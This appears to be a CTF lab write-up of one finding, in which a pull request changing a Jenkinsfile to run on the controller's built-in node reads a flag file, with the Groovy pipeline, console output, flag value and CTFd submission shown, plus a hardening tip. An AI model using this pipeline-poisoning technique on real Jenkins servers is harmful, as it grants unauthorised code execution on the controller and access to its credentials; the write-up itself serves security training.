# F-019: Jenkins Controller-Node Code Execution via Agent Label Override (Cheshire Cat / flag5)

**SEVERITY: CRITICAL**

| Field | Detail |
|---|---|
| Affected Asset | Jenkins controller node (`jenkins-server` container), `Wonderland/cheshire-cat` repository |
| OWASP CI/CD Mapping | **CICD-SEC-5** (Insufficient Pipeline-Based Access Controls) — pipeline can target the controller node directly, bypassing agent isolation · CICD-SEC-4 (PPE) — PR-triggered build executes on the most privileged node available |
| Status | CONFIRMED, CTFd-verified (flag5) |

## Discovery

CTFd's challenge description explicitly stated the objective: execute code on the Jenkins **controller node specifically** (not `agent1`), and read `~/flag5.txt` from its filesystem — a meaningfully different objective from most other findings, since it targets the controller itself, which has privileged access to all Jenkins configuration, credentials, and internal state that agent nodes do not.

`cheshire-cat`'s `config.xml` (read via [CVE-2024-23897](./F-016-CVE-2024-23897-jenkins-cli-arbitrary-file-read.md)) confirmed a standard Gitea-backed multibranch pipeline with no remote Jenkinsfile — the pipeline definition was in the repo itself. The original Jenkinsfile used `agent any`, which schedules builds on **any** available executor, including the controller's built-in node.

## Exploitation

`thealice` had `push:true` on this repo. Branch protection blocked direct pushes to `main`, so a PR was used (same approach as `white-rabbit`). The key change: specifying `agent { label 'built-in' }` forces Jenkins to execute on the controller node specifically, not `agent1`. Since `flag5.txt` was at `/var/jenkins_home/flag5.txt` (the controller's own home directory, not accessible from `agent1`), controller-level execution was necessary.

```groovy
pipeline {
  agent { label 'built-in' }
  stages {
    stage('VAPT_ControllerRCE') {
      steps {
        sh 'hostname'
        sh 'cat /var/jenkins_home/flag5.txt'
      }
    }
  }
}
```

Console output confirmed controller-node execution (hostname = `jenkins-server` container):

```
+ hostname
57cebe8d6776
+ cat /var/jenkins_home/flag5.txt
6B31A679-6D70-469D-9F8D-6D6E80B3C29C
```

```
POST /api/v1/challenges/attempt {"challenge_id":5,"submission":"6B31A679-6D70-469D-9F8D-6D6E80B3C29C"}
-> {"status":"correct"}
```

## Interview Talking Point

`agent any` is a common default in Jenkins pipeline templates — it's convenient but silently includes the built-in controller node as an eligible executor. Explicitly restricting pipelines to use only dedicated agent nodes (via labels or other constraints), and disabling execution on the built-in node entirely in Jenkins settings, is a concrete, single-configuration-change hardening step with significant security impact.
